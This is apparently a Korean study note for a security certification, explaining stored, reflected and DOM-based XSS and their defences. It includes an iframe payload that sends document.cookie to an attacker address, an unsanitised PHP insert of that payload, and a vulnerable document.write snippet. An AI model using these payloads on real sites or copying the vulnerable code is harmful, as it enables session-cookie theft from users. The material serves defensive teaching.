---
title: 정보보안 - XSS(Cross Site Script)
date: '2021-07-05 19:00:00'
tags:
- 정보보안기사
- 어플리케이션
related: true
categories:
- IS_Certification
toc: true
---

# XSS(Cross Site Script)

- 개요
    + SQL Injection : 입력값 필터링이 되지 않아 발생
    + XSS (Cross Site Script) : 입력값 필터링이 되지 않아 발생
    + Form 입력 양식에 악의적인 스크립트를 작성하여 입력 혹은 URL 입력창에 스크립트를 작성하여 입력
        * 웹서버에 입력
        * Javascript, ActiveX, VBscript, Flash파일 (swf) 등 삽입
    + 공격자에게 개인정보, 쿠키정보 등을 전송, 피해자 PC에 악성코드 설치
    + 다운로드 받은 html 문서 안에 javascript 등의 악성 스크립트가 포함
    + 브라우저에서 자동 실행됨
    + Client 가 희생자가 됨
- 과정
    + 공격자가 XSS 를 서버에 삽입 (XSS 취약점이 존재하는 서버)
    + 희생자(클라이언트)가 서버의 XSS 에 접근
    + 희생자가 서버의 XSS 스크립트가 포함된 문서를 다운로드
    + 희생자의 PC에서 스크립트가 실행됨
    + 악성코드가 설치되거나 정보가 공격자에게 전달됨
- 방식
    + Stored XSS (저장형 XSS)
        * 개요
            - 가장 일반적인 형태의 XSS
            - 공격자가 게시판, 자료실 등에 스크립트를 입력하여 저장 (DB 저장)
            - 희생자가 게시물을 열람하는 순간 악성 스크립트가 클라이언트에서 실행됨
            - 서버 취약점 점검이 필요
        * 공격방식
            - 주로 `<iframe>` 태그를 이용함
                + 최근에는 `<iframe>` 태그를 사용자제
                + `<iframe width=0 height=0 src="javascript:document.location.href='http://192.168.10.1/abc/a.php?cookie=document.cookie'"></iframe>`
                    * 공격자의 주소로 cookie 값을 전송
            ```
                $content = "<iframe width=0 height=0 src="javascript:document.location.href='http://192.168.10.1/abc/a.php?cookie=document.cookie'"></iframe>";
                $query = "insert into $bbs(id, name, subject, content)
                values ('$id', '$name', '$subject', '$content')";
            ```
        * 대응방법
            - XSS 공격은 HTML, 스크립트 태그를 사용
            - HTML 특수문자
                + htmlspecialchars() 함수 이용 (PHP)
                    * `$content = htmlspecialchars($content,ENT_QUOTES);`
                        - ENT_QUOTES : `'`, `"` 모두 변환
                        - 사용하지 않을 경우 : `"` 만 변환
                    * 함수 사용시 태그 내용이 그대로 출력됨
                    * HTML 특수문자를 escape 처리하여 일반문자 (HTML Entity) 로 치환
                        - `<` : `&lt;`
                        - `>` : `&gt;`
                        - `&` : `&amp;`
                        - `"` : `&quot;`
                        - `'` : `&#039;` : `&#x27;` (16진수)
                        - `(` : `&#40;` : `&#x28;` (16진수)
                        - `)` : `&#41;` : `&#x29;` (16진수)
                        - `#` : `&#x23;` (16진수)
                        - `/` : `&#x2F;` (16진수)
                        - 소스보기 시 일반문자로 보이게 됨 (`&lt;` 등)
                + strip_tags() 이용
                    * 스크립트 태그를 제거
    + Reflected XSS (반사형 XSS)
        * 개요
            - 악성스크립트를 서버 DB에 저장하지 않음
            - 악성스크립트를 직접 클릭하도록 유도
                + 공격자가 악성스크립트 링크를 포함한 메일 전송
                + 희생자는 메일 링크 클릭
                    * `url.php?q=스크립트` : 희생자가 알아볼 수 없도록 처리
                + 희생자가 링크를 클릭하여 웹서버에 요청
                + 서버는 스크립트의 내용을 처리하지 않고 그대로 응답 (서버 처리 스크립트 X)
                    * 일반적으로 서버에 검색내용을 입력
                        - 입력값 예 : `www.test.com/search/?q=<script>alert(document.cookie)</script>`
                        - 검색 결과 있는 경우
                            + 결과값을 사용자에게 전달
                        - 검색 결과 없는 경우  
                            + 사용자 입력값을 그대로 HTML 에 포함하여 응답
                            + 요청값을 서버에서 반사시킴 
                            + 응답 예 : 
                            ```
                                <h2><span class=''>Search Result</span><br/>
                                Search:<script>alert(document.cookie)</script>
                                </body>"
                            ```
                + 희생자는 공격자에게 자신의 정보 전달
                    * 응답페이지가 희생자에게 전달되면서 스크립트 실행
        * 공격방식
            - 공격자는 XSS 취약점이 있는 사이트를 발견
            - 중요 정보를 획득할 수 있는 공격용 악성 URL을 생성
            - 이 URL을 이메일을 이용하여 배포
            - 희생자가 URL을 클릭시 악성스크립트가 희생자에 반사되어 공격을 당하게 됨
        * 대응방법
            - XSS 취약점이 있는 사이트에서 특수문자를 일반문자 (HTML Entity) 로 치환
    + DOM based XSS
        * 개요
            - DOM (Document Object Model) : HTML/XML 문서 (계층구조)
                + W3C 에서 정의 
                + HTML/XML 문서의 접근방법을 표준으로 정의하는 모델
            - HTML
                ```
                    <html>
                        <head>
                            <title></title>
                        </head>
                        <body>
                            <h2></h2>
                        </body>
                    </html>
                ```
            - XML
                ```
                    <book>
                        <subject></subject>
                        <writer></writer>
                    </book>
                ```
            - DOM based XSS
                + Stored XSS, Reflected XSS 와 달리 서버의 응답과 관계없음
                + 피해자의 브라우저에서 발생
                + 피해자의 브라우저가 DOM 구문분석을 할 때 악성스크립트 실행
                + Javascript 가 DOM 내용을 변화시킴
        * 공격방식
            - 공격자가 희생자에게 메일링크(악성스크립트 포함)가 포함된 메일을 보냄
            - 희생자가 링크를 클릭하면 웹서버에 요청
            - 웹서버가 응답 (악성스크립트 미포함)
            - 희생자의 요청에 포함된 URL 악성스크립트가 그대로 남아있음
            - URL 쿼리스트링의 파라미터를 응답페이지에 있는 DOM을 이용해서 동적으로 악성스크립트를 실행
                ```
                    <HTML>
                        <HEAD><TITLE>Welcome</TITLE></HEAD>
                        <script>
                            var pos = document.URL.indexOf("name=")+5;
                            document.write(document.URL.substring(pos,document.URL.length))
                            /*
                            http://www.abc.com/page.php?name=kim
                            http://www.abc.com/page.php?name=<script>alert()</script>
                            */
                        </script>
                        <body>
                            안녕하세요
                            아래페이지를 참고하세요
                            링크페이지 <!-- 악성코드 url -->
                        </body>
                    </HTML>
                ```
                + 이메일 링크 등에 악성스크립트를 포함한 url 전송
                + url 클릭 시 document.write 함수가 있는 서버로 연결
                + 클라이언트 브라우저에서 DOM 에 악성코드를 추가
                + 브라우저에서 악성스크립트 실행